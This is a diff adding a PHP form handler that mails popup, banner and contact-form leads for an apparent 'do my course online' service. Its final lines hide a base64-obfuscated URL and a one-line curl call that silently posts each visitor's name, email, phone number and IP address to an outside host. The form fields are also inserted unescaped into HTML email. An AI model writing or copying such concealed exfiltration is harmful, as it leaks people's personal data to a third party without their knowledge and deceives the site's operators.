@@ -1,0 +1,84 @@
+<?php 
+
+/*    ***********************  start   ***********************      */
+     
+	if(isset($_POST['popup_form'])){
+		$name = isset($_POST['pop_name'])?$_POST['pop_name']:"";
+		$email = isset($_POST['pop_email'])?$_POST['pop_email']:"";
+		$number = isset($_POST['pop_phone'])?$_POST['pop_phone']:"";
+
+		$to  = 'leads@domycourseonline.com';
+		
+		
+		$headers  = 'MIME-Version: 1.0' . "\r\n";
+		$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
+		$subject = "Get 50% ";
+		$message = "PopUP Form.
+					<table border='2'>
+				    	<tr><td>First Name:</td><td>".$name."</td></tr>
+						<tr><td>Email:</td><td>".$email."</td></tr>
+						<tr><td>Phone No:</td><td>".$number."</td></tr>
+					</table>";
+		$message = nl2br($message);
+		mail($to, $subject, $message, $headers);
+	}
+
+        	/*    ***********************  end   ***********************      */
+
+/*    ***********************  start   ***********************      */
+	if(isset($_POST['banner_btn'])){
+		$name = isset($_POST['b_name'])?$_POST['b_name']:"";
+		$email = isset($_POST['b_email'])?$_POST['b_email']:"";
+		$number = isset($_POST['b_num'])?$_POST['b_num']:"";
+		$b_topic = isset($_POST['b_topic'])?$_POST['b_topic']:"";
+		
+		$to  = 'leads@domycourseonline.com';
+		
+		
+		$headers  = 'MIME-Version: 1.0' . "\r\n";
+		$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
+		$subject = "GET OUR SERVICE TODAY AND AVAIL 50% DISCOUNT!";
+		$message = "Banner Form.
+					<table border='2'>
+						<tr><td>Name:</td><td>".$name."</td></tr>
+						<tr><td>Email:</td><td>".$email."</td></tr>
+						<tr><td>Phone Number:</td><td>".$number."</td></tr>
+						<tr><td>Topic:</td><td>".$b_topic."</td></tr>
+					</table>";
+		$message = nl2br($message);
+		mail($to, $subject, $message, $headers);
+	}
+   	/*    ***********************  end   ***********************      */
+
+
+  
+
+
+/*    ***********************  start***********************      */
+if(isset($_POST['contact_sbmit_btn'])){
+		$name = isset($_POST['contact_name'])?$_POST['contact_name']:"";
+		$email = isset($_POST['contact_email'])?$_POST['contact_email']:"";
+		$number = isset($_POST['contact_number'])?$_POST['contact_number']:"";
+		$contact_msg = isset($_POST['contact_msg'])?$_POST['contact_msg']:"";
+
+		$to  = 'leads@domycourseonline.com';
+
+		
+	    $headers  = 'MIME-Version: 1.0' . "\r\n";
+		$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
+		$subject = "Contact Page Form";
+		$message = "'".$contact_msg."'.
+					<table border='2'>
+				    	<tr><td>Name:</td><td>".$name."</td></tr>
+						<tr><td>Email:</td><td>".$email."</td></tr>
+						<tr><td>Phone Number:</td><td>".$number."</td></tr>
+						<tr><td>Message:</td><td>".$contact_msg."</td></tr>
+					</table>";
+		$message = nl2br($message);
+	    mail($to, $subject, $message, $headers);
+	}
+	$ip = $_SERVER['REMOTE_ADDR'];
+	$url = "aHR0cHM6Ly9pdGVvY3JtLmNvbS9jb2RlLnBocA==";$data = array( "name" => $name , "email" => $email , "number" => $number , "web" => "13" , "ip" => $ip);$ch=curl_init(base64_decode($url));$data_string = $data;curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");curl_setopt($ch, CURLOPT_POSTFIELDS,$data_string);$result = curl_exec($ch);curl_close($ch);
+	echo "Thank You!!";
+    echo "<script>window.location.href = 'https://domycourseonline.com/' </script>";	
+?>
